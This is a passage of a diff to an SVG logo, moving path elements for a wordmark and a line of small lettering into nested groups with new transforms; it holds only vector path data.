-          <path d="M229.1,136.385v18.229h5.529V137.466a5.936,5.936,0,0,1,3.686-1.4,6.965,6.965,0,0,1,2.2.24l1.522-3.526a9.536,9.536,0,0,0-3.646-.681,12.163,12.163,0,0,0-9.295,4.287" transform="translate(-198.17 -123.524)" fill="currentColor"/>
-          <path d="M352.233,142.4c-2.244-.16-2.725-1.2-2.725-2.885V117.6l-5.409.962v20.633c0,4.888,2.564,6.971,6.891,6.971a12.417,12.417,0,0,0,2.083-.24V142.44a4.171,4.171,0,0,0-.841-.04" transform="translate(-267.096 -114.836)" fill="currentColor"/>
-          <path d="M270.629,117.6l-5.529.921v20.713c0,4.648,2.644,6.851,7.051,6.851a11.279,11.279,0,0,0,2.043-.2V142.44h-.761c-2.324-.08-2.8-1.4-2.8-2.925V127.857h3.566V123.77h-3.566Z" transform="translate(-219.747 -114.836)" fill="currentColor"/>
+        <g transform="translate(58.856 110.7)">
+          <g>
+            <g transform="translate(36.705)">
+              <path d="M205.786,110.7a3.523,3.523,0,0,0-3.486,3.526,3.447,3.447,0,1,0,6.891.04,3.489,3.489,0,0,0-3.405-3.566" transform="translate(-182.107 -110.7)" fill="currentColor"/>
+              <path d="M204.8,155h5.409V132.8l-5.409.922Z" transform="translate(-183.606 -123.946)" fill="currentColor"/>
+              <path d="M163.519,150.25a5.117,5.117,0,0,1-2.8.721c-2.163,0-3.165-1.723-3.125-3.726a3.464,3.464,0,0,1,3.766-3.526h2.164Zm-2.244-18.35a15.769,15.769,0,0,0-7.292,1.963l-.6.32,1.442,3.325.841-.4a12.2,12.2,0,0,1,5.128-1.242c1.963.08,2.764,1,2.764,2.925v1.122h-3.205c-5.168,0-8.374,2.8-8.454,7.172a7.837,7.837,0,0,0,8.053,7.732,12.414,12.414,0,0,0,9.135-3.486V139.552c-.08-5.769-4.047-7.652-7.813-7.652" transform="translate(-151.9 -123.406)" fill="currentColor"/>
+              <path d="M301.493,136.367c2.4,0,2.764,2.684,2.764,4.367h-5.89c.12-2.164.962-4.367,3.125-4.367m1.162,14.744a3.851,3.851,0,0,1-3.125-1.242c-.962-1.082-1.4-3.325-1.282-5.689h11.659v-.561c-.12-7.853-2.684-11.418-8.414-11.418-6.37,0-8.854,6.01-8.894,11.7-.04,3.566,1.282,7.172,3.686,9.215a8.858,8.858,0,0,0,5.85,1.923,12.639,12.639,0,0,0,3.846-.6,16.449,16.449,0,0,0,4.087-2.043l-1.522-3.245a9.9,9.9,0,0,1-5.89,1.963" transform="translate(-236.228 -123.586)" fill="currentColor"/>
+              <path d="M229.1,136.385v18.229h5.529V137.466a5.936,5.936,0,0,1,3.686-1.4,6.965,6.965,0,0,1,2.2.24l1.522-3.526a9.536,9.536,0,0,0-3.646-.681,12.163,12.163,0,0,0-9.295,4.287" transform="translate(-198.17 -123.524)" fill="currentColor"/>
+              <path d="M352.233,142.4c-2.244-.16-2.725-1.2-2.725-2.885V117.6l-5.409.962v20.633c0,4.888,2.564,6.971,6.891,6.971a12.417,12.417,0,0,0,2.083-.24V142.44a4.171,4.171,0,0,0-.841-.04" transform="translate(-267.096 -114.836)" fill="currentColor"/>
+              <path d="M270.629,117.6l-5.529.921v20.713c0,4.648,2.644,6.851,7.051,6.851a11.279,11.279,0,0,0,2.043-.2V142.44h-.761c-2.324-.08-2.8-1.4-2.8-2.925V127.857h3.566V123.77h-3.566Z" transform="translate(-219.747 -114.836)" fill="currentColor"/>
+            </g>
+            <path d="M71.71,146.565a24.836,24.836,0,0,0,4.607-2.4l.361-.24a34.286,34.286,0,0,0,4.327-3.285,19.866,19.866,0,0,0,6.29-9.015,11.537,11.537,0,0,0,.321-6.571,8.528,8.528,0,0,0-3.285-4.487,9.621,9.621,0,0,0-6.01-1.763c-3.486,0-7.292,1.362-11.338,4.006l-.12.08h0l-.361.24a2.233,2.233,0,0,1-.321.2,26.258,26.258,0,0,0-2.364,1.8c-1.723,1.643-3.646,4.407-3.526,6.771a3.114,3.114,0,0,0,1.242,2.4,4.163,4.163,0,0,0,2.564.8,12.24,12.24,0,0,0,5.889-2.083c.08-.08.2-.12.28-.2a9.068,9.068,0,0,1,.8-.521l.28-.16a30.98,30.98,0,0,1,7.051-3.886,5.2,5.2,0,0,1,1.8-.321,4.438,4.438,0,0,1,.761.08,2.386,2.386,0,0,1,1.683,1.322,6.1,6.1,0,0,1-.361,4.888,21.561,21.561,0,0,1-5.649,7.011,21.633,21.633,0,0,1-3.686,2.644l-.08.04a13.809,13.809,0,0,1-1.723.841l-.08.04a3.363,3.363,0,0,1-.481.16c-2.564.681-1-1.563-1-1.563a25.048,25.048,0,0,1,1.763-1.8c.361-.32.721-.681,1.082-1.042l.08-.08a2.719,2.719,0,0,0,1.042-1.963,2.315,2.315,0,0,0-2.364-1.963h-.08a4.829,4.829,0,0,0-2.764,1.162,8.4,8.4,0,0,0-1.843,2.083c-.681,1.082-2.123,3.886-.721,6.09a3.1,3.1,0,0,0,2.8,1.322,9.408,9.408,0,0,0,3.125-.641" transform="translate(-60.287 -115.555)" fill="currentColor"/>
+          </g>
         </g>
-        <path d="M71.71,146.565a24.836,24.836,0,0,0,4.607-2.4l.361-.24a34.286,34.286,0,0,0,4.327-3.285,19.866,19.866,0,0,0,6.29-9.015,11.537,11.537,0,0,0,.321-6.571,8.528,8.528,0,0,0-3.285-4.487,9.621,9.621,0,0,0-6.01-1.763c-3.486,0-7.292,1.362-11.338,4.006l-.12.08h0l-.361.24a2.233,2.233,0,0,1-.321.2,26.258,26.258,0,0,0-2.364,1.8c-1.723,1.643-3.646,4.407-3.526,6.771a3.114,3.114,0,0,0,1.242,2.4,4.163,4.163,0,0,0,2.564.8,12.24,12.24,0,0,0,5.889-2.083c.08-.08.2-.12.28-.2a9.068,9.068,0,0,1,.8-.521l.28-.16a30.98,30.98,0,0,1,7.051-3.886,5.2,5.2,0,0,1,1.8-.321,4.438,4.438,0,0,1,.761.08,2.386,2.386,0,0,1,1.683,1.322,6.1,6.1,0,0,1-.361,4.888,21.561,21.561,0,0,1-5.649,7.011,21.633,21.633,0,0,1-3.686,2.644l-.08.04a13.809,13.809,0,0,1-1.723.841l-.08.04a3.363,3.363,0,0,1-.481.16c-2.564.681-1-1.563-1-1.563a25.048,25.048,0,0,1,1.763-1.8c.361-.32.721-.681,1.082-1.042l.08-.08a2.719,2.719,0,0,0,1.042-1.963,2.315,2.315,0,0,0-2.364-1.963h-.08a4.829,4.829,0,0,0-2.764,1.162,8.4,8.4,0,0,0-1.843,2.083c-.681,1.082-2.123,3.886-.721,6.09a3.1,3.1,0,0,0,2.8,1.322,9.408,9.408,0,0,0,3.125-.641" transform="translate(-60.287 -115.555)" fill="currentColor"/>
+        <g transform="translate(57.9 150.124)">
+          <path d="M58.5,217.453a.9.9,0,0,1-.4-.12c-.12-.08-.2-.16-.2-.28v-.08c0-.04.04-.08.04-.16l2.925-6.931a.483.483,0,0,1,.2-.2.852.852,0,0,1,.721,0,.4.4,0,0,1,.16.2l2.885,6.891a.2.2,0,0,1,.04.12v.08a.408.408,0,0,1-.2.32.677.677,0,0,1-.4.12.339.339,0,0,1-.24-.08.875.875,0,0,1-.16-.2l-.841-2H59.623l-.881,2A.243.243,0,0,1,58.5,217.453Zm2.925-6.571-1.362,3.446h2.684Z" transform="translate(-57.9 -209.4)" fill="currentColor"/>
+          <path d="M91.629,216.811a.677.677,0,0,1,.08.2v.12a.364.364,0,0,1-.16.321.677.677,0,0,1-.4.12.339.339,0,0,1-.24-.08c-.08-.04-.12-.16-.2-.28l-1.6-3H87.062v2.885a.49.49,0,0,1-.12.361c-.08.08-.2.08-.361.08a.8.8,0,0,1-.361-.08.49.49,0,0,1-.12-.361v-6.811a.425.425,0,0,1,.481-.481h1.963a3.768,3.768,0,0,1,2.244.561A1.938,1.938,0,0,1,91.509,212a2.76,2.76,0,0,1-.08.521,3.143,3.143,0,0,1-.2.561,1.8,1.8,0,0,1-.441.521,3.074,3.074,0,0,1-.721.4Zm-4.527-6.17v2.764h1.442a5.756,5.756,0,0,0,.962-.08,1.7,1.7,0,0,0,.6-.24.713.713,0,0,0,.321-.441,1.369,1.369,0,0,0,.08-.6,3.092,3.092,0,0,0-.08-.6,1.136,1.136,0,0,0-.321-.441,2.092,2.092,0,0,0-.6-.28,3.151,3.151,0,0,0-.921-.08Z" transform="translate(-74.802 -209.52)" fill="currentColor"/>
+          <path d="M104.922,213.967v2.644h3.926a.394.394,0,0,1,.321.12c.08.08.08.16.08.32a.621.621,0,0,1-.08.321.394.394,0,0,1-.321.12h-4.367a.425.425,0,0,1-.481-.481v-6.731a.425.425,0,0,1,.481-.481h4.367a.394.394,0,0,1,.321.12c.08.08.08.16.08.321a.62.62,0,0,1-.08.32.394.394,0,0,1-.321.12h-3.926v2.484h3.726a.394.394,0,0,1,.321.12c.08.08.08.16.08.32a.621.621,0,0,1-.08.321.394.394,0,0,1-.321.12h-3.726Z" transform="translate(-85.53 -209.52)" fill="currentColor"/>
+          <path d="M120.3,217.453a.9.9,0,0,1-.4-.12c-.12-.08-.2-.16-.2-.28v-.08c0-.04.04-.08.04-.16l2.925-6.931a.483.483,0,0,1,.2-.2.852.852,0,0,1,.721,0,.4.4,0,0,1,.16.2l2.885,6.891a.2.2,0,0,1,.04.12v.08a.408.408,0,0,1-.2.32.677.677,0,0,1-.4.12.339.339,0,0,1-.24-.08.875.875,0,0,1-.16-.2l-.841-2h-3.405l-.881,2A.243.243,0,0,1,120.3,217.453Zm2.925-6.571-1.362,3.446h2.684Z" transform="translate(-94.94 -209.4)" fill="currentColor"/>
+          <path d="M143.406,212.906a3.065,3.065,0,0,1,1.4.761,1.947,1.947,0,0,1,.441,1.322,2.473,2.473,0,0,1-.2,1,1.9,1.9,0,0,1-.561.681,2.05,2.05,0,0,1-.841.4,3.951,3.951,0,0,1-.962.12,5.355,5.355,0,0,1-1.6-.24,3.037,3.037,0,0,1-1.282-.8c-.08-.12-.16-.2-.16-.24,0-.08-.04-.12-.04-.2a.364.364,0,0,1,.16-.321.72.72,0,0,1,.361-.16.208.208,0,0,1,.16.08.553.553,0,0,0,.16.12,3.063,3.063,0,0,0,1.042.721,3.529,3.529,0,0,0,1.162.2,2,2,0,0,0,1.162-.321,1.023,1.023,0,0,0,.441-.962,1.32,1.32,0,0,0-.321-.881,3.364,3.364,0,0,0-1.082-.561l-.962-.28a3.6,3.6,0,0,1-1.522-.761,1.84,1.84,0,0,1-.521-1.362,1.9,1.9,0,0,1,.24-.962,1.854,1.854,0,0,1,.6-.641,2.729,2.729,0,0,1,.841-.4,3.639,3.639,0,0,1,.921-.12,4.192,4.192,0,0,1,1.442.24,2.327,2.327,0,0,1,1.122.841.877.877,0,0,0,.12.2.241.241,0,0,1,.04.16.364.364,0,0,1-.16.321.455.455,0,0,1-.32.12.3.3,0,0,1-.2-.04.7.7,0,0,1-.2-.16,3.142,3.142,0,0,0-.841-.681,2.624,2.624,0,0,0-1-.2,3.1,3.1,0,0,0-.6.08,1.242,1.242,0,0,0-.521.24,1.136,1.136,0,0,0-.361.4,1.279,1.279,0,0,0-.12.561,1.186,1.186,0,0,0,.08.4.873.873,0,0,0,.2.32,1.023,1.023,0,0,0,.4.28,4.293,4.293,0,0,0,.681.24Z" transform="translate(-106.867 -209.1)" fill="currentColor"/>
+          <path d="M163.872,213.347a4.64,4.64,0,0,1-.28,1.683,3.758,3.758,0,0,1-.761,1.282,3.355,3.355,0,0,1-1.162.8,3.622,3.622,0,0,1-1.482.28,3.5,3.5,0,0,1-1.482-.28,3.355,3.355,0,0,1-1.162-.8,4.032,4.032,0,0,1-.761-1.282,5.277,5.277,0,0,1-.28-1.683,4.639,4.639,0,0,1,.28-1.683,3.757,3.757,0,0,1,.761-1.282,3.355,3.355,0,0,1,1.162-.8,3.621,3.621,0,0,1,1.482-.28,3.5,3.5,0,0,1,1.482.28,3.354,3.354,0,0,1,1.162.8,4.031,4.031,0,0,1,.761,1.282A4.36,4.36,0,0,1,163.872,213.347Zm-6.25,0a4.158,4.158,0,0,0,.16,1.282,3.327,3.327,0,0,0,.481,1,2.466,2.466,0,0,0,.8.641,2.56,2.56,0,0,0,1.122.24,2.439,2.439,0,0,0,1.122-.24,2.4,2.4,0,0,0,1.282-1.643,4.324,4.324,0,0,0,.16-1.282,4.157,4.157,0,0,0-.16-1.282,3.327,3.327,0,0,0-.481-1,2.465,2.465,0,0,0-.8-.641,2.559,2.559,0,0,0-1.122-.24,2.439,2.439,0,0,0-1.122.24,2.109,2.109,0,0,0-.8.641,2.592,2.592,0,0,0-.481,1A4.156,4.156,0,0,0,157.622,213.347Z" transform="translate(-116.996 -209.22)" fill="currentColor"/>
+          <path d="M179.862,211.1v5.809c0,.16-.04.28-.12.321-.08.08-.2.08-.361.08a.8.8,0,0,1-.361-.08.394.394,0,0,1-.12-.321v-6.931c0-.16.04-.321.16-.361a.644.644,0,0,1,.441-.12.6.6,0,0,1,.4.12,1.107,1.107,0,0,1,.24.321l3.926,5.849v-5.849c0-.16.04-.281.12-.321.08-.08.2-.08.361-.08a.8.8,0,0,1,.361.08.394.394,0,0,1,.12.321v6.971c0,.16-.04.321-.16.361a.644.644,0,0,1-.441.12.6.6,0,0,1-.4-.12,1.106,1.106,0,0,1-.24-.321Z" transform="translate(-130.422 -209.34)" fill="currentColor"/>
+          <path d="M208.486,217.032a.49.49,0,0,1-.12.361c-.08.08-.2.08-.361.08a.8.8,0,0,1-.361-.08.49.49,0,0,1-.12-.361v-6.45H205.2c-.16,0-.28-.04-.32-.12a.431.431,0,0,1-.08-.321.754.754,0,0,1,.08-.321.394.394,0,0,1,.32-.12h5.609c.16,0,.28.04.32.12.08.08.08.16.08.321a.62.62,0,0,1-.08.321.394.394,0,0,1-.32.12h-2.324Z" transform="translate(-145.945 -209.46)" fill="currentColor"/>
+          <path d="M229.272,213.347a4.64,4.64,0,0,1-.28,1.683,3.759,3.759,0,0,1-.761,1.282,3.355,3.355,0,0,1-1.162.8,3.622,3.622,0,0,1-1.482.28,3.5,3.5,0,0,1-1.482-.28,3.355,3.355,0,0,1-1.162-.8,4.03,4.03,0,0,1-.761-1.282,5.278,5.278,0,0,1-.28-1.683,4.64,4.64,0,0,1,.28-1.683,3.757,3.757,0,0,1,.761-1.282,3.354,3.354,0,0,1,1.162-.8,3.621,3.621,0,0,1,1.482-.28,3.5,3.5,0,0,1,1.482.28,3.355,3.355,0,0,1,1.162.8,4.031,4.031,0,0,1,.761,1.282A4.361,4.361,0,0,1,229.272,213.347Zm-6.29,0a4.157,4.157,0,0,0,.16,1.282,3.326,3.326,0,0,0,.481,1,2.466,2.466,0,0,0,.8.641,2.559,2.559,0,0,0,1.122.24,2.439,2.439,0,0,0,1.122-.24,2.4,2.4,0,0,0,1.282-1.643,4.325,4.325,0,0,0,.16-1.282,4.157,4.157,0,0,0-.16-1.282,3.327,3.327,0,0,0-.481-1,2.465,2.465,0,0,0-.8-.641,2.559,2.559,0,0,0-1.122-.24,2.439,2.439,0,0,0-1.122.24,2.4,2.4,0,0,0-1.282,1.643A5.886,5.886,0,0,0,222.982,213.347Z" transform="translate(-156.194 -209.22)" fill="currentColor"/>
+          <path d="M253.263,216.712a.6.6,0,0,1-.16.441.829.829,0,0,1-.6.2c-.521,0-.8-.2-.8-.641v-6.571a.6.6,0,0,1,.2-.481,1.158,1.158,0,0,1,.561-.16.848.848,0,0,1,.561.16.547.547,0,0,1,.2.481v6.571Z" transform="translate(-174.055 -209.34)" fill="currentColor"/>
+          <path d="M267.011,212.184l-1.763,4.848a.661.661,0,0,1-.321.4,1.067,1.067,0,0,1-.481.12.832.832,0,0,1-.6-.16,1.256,1.256,0,0,1-.32-.441l-1.643-4.367v4.447a.6.6,0,0,1-.16.441.829.829,0,0,1-.6.2c-.28,0-.481-.04-.561-.16a.638.638,0,0,1-.16-.481v-6.37a.632.632,0,0,1,.281-.6,1.7,1.7,0,0,1,1.522.04,1.017,1.017,0,0,1,.361.521l1.883,5.409,1.8-5.369a.91.91,0,0,1,.441-.561,1.588,1.588,0,0,1,.8-.16,1.2,1.2,0,0,1,.721.16.625.625,0,0,1,.28.521v6.49a.6.6,0,0,1-.16.441.829.829,0,0,1-.6.2.725.725,0,0,1-.561-.16.639.639,0,0,1-.16-.481v-4.928Z" transform="translate(-179.269 -209.579)" fill="currentColor"/>
+          <path d="M285.523,215.87l-.4,1.082a.458.458,0,0,1-.28.321.659.659,0,0,1-.4.08.941.941,0,0,1-.641-.2.643.643,0,0,1-.2-.441,1.17,1.17,0,0,1,.08-.361l2.444-6.29a.806.806,0,0,1,.361-.441,1.234,1.234,0,0,1,.521-.12,1.109,1.109,0,0,1,.521.12.686.686,0,0,1,.361.441l2.4,6.29a1.237,1.237,0,0,1,.08.321.664.664,0,0,1-.2.481.792.792,0,0,1-.561.2.815.815,0,0,1-.761-.441l-.441-1.042Zm1.442-4.247-1,2.925h1.963Z" transform="translate(-193.174 -209.34)" fill="currentColor"/>
+          <path d="M306.086,210.562a1.952,1.952,0,0,0-1,.24,2.452,2.452,0,0,0-.681.6,2.909,2.909,0,0,0-.361.881,4.365,4.365,0,0,0-.12,1.042,3.3,3.3,0,0,0,.521,2,1.834,1.834,0,0,0,1.562.721,2.169,2.169,0,0,0,.761-.12,1.85,1.85,0,0,0,.6-.361,1.653,1.653,0,0,0,.4-.521,1.914,1.914,0,0,0,.24-.721h-1.362a.726.726,0,0,1-.561-.2.806.806,0,0,1-.12-.441.613.613,0,0,1,.681-.681h2.123a.639.639,0,0,1,.481.16.692.692,0,0,1,.2.521v3.205c0,.08-.04.12-.08.2a.873.873,0,0,1-.2.12,1,1,0,0,1-.4.04.889.889,0,0,1-.361-.04.877.877,0,0,1-.2-.12.3.3,0,0,1-.08-.16c0-.08-.04-.12-.04-.2v-.4a.483.483,0,0,1-.2.2.7.7,0,0,1-.2.16,2.58,2.58,0,0,1-.8.441,4.176,4.176,0,0,1-1.122.16,3.686,3.686,0,0,1-1.522-.28,3.2,3.2,0,0,1-1.122-.8,3.409,3.409,0,0,1-.681-1.242,5.326,5.326,0,0,1-.24-1.683,6.012,6.012,0,0,1,.2-1.482,3.471,3.471,0,0,1,.681-1.322,3.3,3.3,0,0,1,1.162-.921,3.952,3.952,0,0,1,1.763-.361,3.883,3.883,0,0,1,1.442.24,3.991,3.991,0,0,1,1.162.721,1.437,1.437,0,0,1,.28.4.807.807,0,0,1,.12.441.687.687,0,0,1-.721.721.6.6,0,0,1-.4-.12,3.269,3.269,0,0,0-.361-.32c-.12-.12-.24-.2-.32-.28a.872.872,0,0,0-.32-.2,1.272,1.272,0,0,0-.361-.12A.645.645,0,0,0,306.086,210.562Z" transform="translate(-204.322 -209.16)" fill="currentColor"/>
+          <path d="M326.163,216.712a.6.6,0,0,1-.16.441.829.829,0,0,1-.6.2c-.521,0-.8-.2-.8-.641v-6.571a.6.6,0,0,1,.2-.481,1.159,1.159,0,0,1,.561-.16.848.848,0,0,1,.561.16.547.547,0,0,1,.2.481v6.571Z" transform="translate(-217.748 -209.34)" fill="currentColor"/>
+          <path d="M334.2,209.6a1.441,1.441,0,0,1,.441.08,1.884,1.884,0,0,1,.441.4l2.8,4.327a3.669,3.669,0,0,0,.2.321,2.37,2.37,0,0,1,.16.321c0-.12-.04-.28-.04-.481v-4.327a.546.546,0,0,1,.2-.481,1.036,1.036,0,0,1,.561-.16.783.783,0,0,1,.561.16.6.6,0,0,1,.2.481v6.49a.508.508,0,0,1-.04.24.569.569,0,0,1-.08.24.368.368,0,0,1-.24.16,1,1,0,0,1-.4.08.854.854,0,0,1-.481-.12,1.53,1.53,0,0,1-.361-.361l-2.764-4.047a3.7,3.7,0,0,0-.2-.321c-.08-.12-.16-.28-.24-.4,0,.12.04.28.04.481v4.127a.6.6,0,0,1-.16.441.829.829,0,0,1-.6.2c-.521,0-.8-.2-.8-.641v-6.45a.672.672,0,0,1,.24-.561A.651.651,0,0,1,334.2,209.6Z" transform="translate(-223.022 -209.4)" fill="currentColor"/>
+          <path d="M354.5,217.492a.531.531,0,0,1-.6-.6v-6.531a.514.514,0,0,1,.16-.4.547.547,0,0,1,.441-.16h4.127a.567.567,0,0,1,.641.641.854.854,0,0,1-.12.481.517.517,0,0,1-.441.2h-3.245v1.8h2.925a.574.574,0,0,1,.441.2.9.9,0,0,1,.04.962.517.517,0,0,1-.441.2H355.5v1.883h3.285a.557.557,0,0,1,.4.2,1.022,1.022,0,0,1,0,.962.547.547,0,0,1-.481.2H354.5Z" transform="translate(-235.309 -209.52)" fill="currentColor"/>
+        </g>
       </g>
-    </g>
-    <g transform="translate(57.9 150.124)">
-      <path d="M58.5,217.453a.9.9,0,0,1-.4-.12c-.12-.08-.2-.16-.2-.28v-.08c0-.04.04-.08.04-.16l2.925-6.931a.483.483,0,0,1,.2-.2.852.852,0,0,1,.721,0,.4.4,0,0,1,.16.2l2.885,6.891a.2.2,0,0,1,.04.12v.08a.408.408,0,0,1-.2.32.677.677,0,0,1-.4.12.339.339,0,0,1-.24-.08.875.875,0,0,1-.16-.2l-.841-2H59.623l-.881,2A.243.243,0,0,1,58.5,217.453Zm2.925-6.571-1.362,3.446h2.684Z" transform="translate(-57.9 -209.4)" fill="currentColor"/>
-      <path d="M91.629,216.811a.677.677,0,0,1,.08.2v.12a.364.364,0,0,1-.16.321.677.677,0,0,1-.4.12.339.339,0,0,1-.24-.08c-.08-.04-.12-.16-.2-.28l-1.6-3H87.062v2.885a.49.49,0,0,1-.12.361c-.08.08-.2.08-.361.08a.8.8,0,0,1-.361-.08.49.49,0,0,1-.12-.361v-6.811a.425.425,0,0,1,.481-.481h1.963a3.768,3.768,0,0,1,2.244.561A1.938,1.938,0,0,1,91.509,212a2.76,2.76,0,0,1-.08.521,3.143,3.143,0,0,1-.2.561,1.8,1.8,0,0,1-.441.521,3.074,3.074,0,0,1-.721.4Zm-4.527-6.17v2.764h1.442a5.756,5.756,0,0,0,.962-.08,1.7,1.7,0,0,0,.6-.24.713.713,0,0,0,.321-.441,1.369,1.369,0,0,0,.08-.6,3.092,3.092,0,0,0-.08-.6,1.136,1.136,0,0,0-.321-.441,2.092,2.092,0,0,0-.6-.28,3.151,3.151,0,0,0-.921-.08Z" transform="translate(-74.802 -209.52)" fill="currentColor"/>
-      <path d="M104.922,213.967v2.644h3.926a.394.394,0,0,1,.321.12c.08.08.08.16.08.32a.621.621,0,0,1-.08.321.394.394,0,0,1-.321.12h-4.367a.425.425,0,0,1-.481-.481v-6.731a.425.425,0,0,1,.481-.481h4.367a.394.394,0,0,1,.321.12c.08.08.08.16.08.321a.62.62,0,0,1-.08.32.394.394,0,0,1-.321.12h-3.926v2.484h3.726a.394.394,0,0,1,.321.12c.08.08.08.16.08.32a.621.621,0,0,1-.08.321.394.394,0,0,1-.321.12h-3.726Z" transform="translate(-85.53 -209.52)" fill="currentColor"/>
-      <path d="M120.3,217.453a.9.9,0,0,1-.4-.12c-.12-.08-.2-.16-.2-.28v-.08c0-.04.04-.08.04-.16l2.925-6.931a.483.483,0,0,1,.2-.2.852.852,0,0,1,.721,0,.4.4,0,0,1,.16.2l2.885,6.891a.2.2,0,0,1,.04.12v.08a.408.408,0,0,1-.2.32.677.677,0,0,1-.4.12.339.339,0,0,1-.24-.08.875.875,0,0,1-.16-.2l-.841-2h-3.405l-.881,2A.243.243,0,0,1,120.3,217.453Zm2.925-6.571-1.362,3.446h2.684Z" transform="translate(-94.94 -209.4)" fill="currentColor"/>
-      <path d="M143.406,212.906a3.065,3.065,0,0,1,1.4.761,1.947,1.947,0,0,1,.441,1.322,2.473,2.473,0,0,1-.2,1,1.9,1.9,0,0,1-.561.681,2.05,2.05,0,0,1-.841.4,3.951,3.951,0,0,1-.962.12,5.355,5.355,0,0,1-1.6-.24,3.037,3.037,0,0,1-1.282-.8c-.08-.12-.16-.2-.16-.24,0-.08-.04-.12-.04-.2a.364.364,0,0,1,.16-.321.72.72,0,0,1,.361-.16.208.208,0,0,1,.16.08.553.553,0,0,0,.16.12,3.063,3.063,0,0,0,1.042.721,3.529,3.529,0,0,0,1.162.2,2,2,0,0,0,1.162-.321,1.023,1.023,0,0,0,.441-.962,1.32,1.32,0,0,0-.321-.881,3.364,3.364,0,0,0-1.082-.561l-.962-.28a3.6,3.6,0,0,1-1.522-.761,1.84,1.84,0,0,1-.521-1.362,1.9,1.9,0,0,1,.24-.962,1.854,1.854,0,0,1,.6-.641,2.729,2.729,0,0,1,.841-.4,3.639,3.639,0,0,1,.921-.12,4.192,4.192,0,0,1,1.442.24,2.327,2.327,0,0,1,1.122.841.877.877,0,0,0,.12.2.241.241,0,0,1,.04.16.364.364,0,0,1-.16.321.455.455,0,0,1-.32.12.3.3,0,0,1-.2-.04.7.7,0,0,1-.2-.16,3.142,3.142,0,0,0-.841-.681,2.624,2.624,0,0,0-1-.2,3.1,3.1,0,0,0-.6.08,1.242,1.242,0,0,0-.521.24,1.136,1.136,0,0,0-.361.4,1.279,1.279,0,0,0-.12.561,1.186,1.186,0,0,0,.08.4.873.873,0,0,0,.2.32,1.023,1.023,0,0,0,.4.28,4.293,4.293,0,0,0,.681.24Z" transform="translate(-106.867 -209.1)" fill="currentColor"/>
-      <path d="M163.872,213.347a4.64,4.64,0,0,1-.28,1.683,3.758,3.758,0,0,1-.761,1.282,3.355,3.355,0,0,1-1.162.8,3.622,3.622,0,0,1-1.482.28,3.5,3.5,0,0,1-1.482-.28,3.355,3.355,0,0,1-1.162-.8,4.032,4.032,0,0,1-.761-1.282,5.277,5.277,0,0,1-.28-1.683,4.639,4.639,0,0,1,.28-1.683,3.757,3.757,0,0,1,.761-1.282,3.355,3.355,0,0,1,1.162-.8,3.621,3.621,0,0,1,1.482-.28,3.5,3.5,0,0,1,1.482.28,3.354,3.354,0,0,1,1.162.8,4.031,4.031,0,0,1,.761,1.282A4.36,4.36,0,0,1,163.872,213.347Zm-6.25,0a4.158,4.158,0,0,0,.16,1.282,3.327,3.327,0,0,0,.481,1,2.466,2.466,0,0,0,.8.641,2.56,2.56,0,0,0,1.122.24,2.439,2.439,0,0,0,1.122-.24,2.4,2.4,0,0,0,1.282-1.643,4.324,4.324,0,0,0,.16-1.282,4.157,4.157,0,0,0-.16-1.282,3.327,3.327,0,0,0-.481-1,2.465,2.465,0,0,0-.8-.641,2.559,2.559,0,0,0-1.122-.24,2.439,2.439,0,0,0-1.122.24,2.109,2.109,0,0,0-.8.641,2.592,2.592,0,0,0-.481,1A4.156,4.156,0,0,0,157.622,213.347Z" transform="translate(-116.996 -209.22)" fill="currentColor"/>
-      <path d="M179.862,211.1v5.809c0,.16-.04.28-.12.321-.08.08-.2.08-.361.08a.8.8,0,0,1-.361-.08.394.394,0,0,1-.12-.321v-6.931c0-.16.04-.321.16-.361a.644.644,0,0,1,.441-.12.6.6,0,0,1,.4.12,1.107,1.107,0,0,1,.24.321l3.926,5.849v-5.849c0-.16.04-.281.12-.321.08-.08.2-.08.361-.08a.8.8,0,0,1,.361.08.394.394,0,0,1,.12.321v6.971c0,.16-.04.321-.16.361a.644.644,0,0,1-.441.12.6.6,0,0,1-.4-.12,1.106,1.106,0,0,1-.24-.321Z" transform="translate(-130.422 -209.34)" fill="currentColor"/>
-      <path d="M208.486,217.032a.49.49,0,0,1-.12.361c-.08.08-.2.08-.361.08a.8.8,0,0,1-.361-.08.49.49,0,0,1-.12-.361v-6.45H205.2c-.16,0-.28-.04-.32-.12a.431.431,0,0,1-.08-.321.754.754,0,0,1,.08-.321.394.394,0,0,1,.32-.12h5.609c.16,0,.28.04.32.12.08.08.08.16.08.321a.62.62,0,0,1-.08.321.394.394,0,0,1-.32.12h-2.324Z" transform="translate(-145.945 -209.46)" fill="currentColor"/>
-      <path d="M229.272,213.347a4.64,4.64,0,0,1-.28,1.683,3.759,3.759,0,0,1-.761,1.282,3.355,3.355,0,0,1-1.162.8,3.622,3.622,0,0,1-1.482.28,3.5,3.5,0,0,1-1.482-.28,3.355,3.355,0,0,1-1.162-.8,4.03,4.03,0,0,1-.761-1.282,5.278,5.278,0,0,1-.28-1.683,4.64,4.64,0,0,1,.28-1.683,3.757,3.757,0,0,1,.761-1.282,3.354,3.354,0,0,1,1.162-.8,3.621,3.621,0,0,1,1.482-.28,3.5,3.5,0,0,1,1.482.28,3.355,3.355,0,0,1,1.162.8,4.031,4.031,0,0,1,.761,1.282A4.361,4.361,0,0,1,229.272,213.347Zm-6.29,0a4.157,4.157,0,0,0,.16,1.282,3.326,3.326,0,0,0,.481,1,2.466,2.466,0,0,0,.8.641,2.559,2.559,0,0,0,1.122.24,2.439,2.439,0,0,0,1.122-.24,2.4,2.4,0,0,0,1.282-1.643,4.325,4.325,0,0,0,.16-1.282,4.157,4.157,0,0,0-.16-1.282,3.327,3.327,0,0,0-.481-1,2.465,2.465,0,0,0-.8-.641,2.559,2.559,0,0,0-1.122-.24,2.439,2.439,0,0,0-1.122.24,2.4,2.4,0,0,0-1.282,1.643A5.886,5.886,0,0,0,222.982,213.347Z" transform="translate(-156.194 -209.22)" fill="currentColor"/>
-      <path d="M253.263,216.712a.6.6,0,0,1-.16.441.829.829,0,0,1-.6.2c-.521,0-.8-.2-.8-.641v-6.571a.6.6,0,0,1,.2-.481,1.158,1.158,0,0,1,.561-.16.848.848,0,0,1,.561.16.547.547,0,0,1,.2.481v6.571Z" transform="translate(-174.055 -209.34)" fill="currentColor"/>
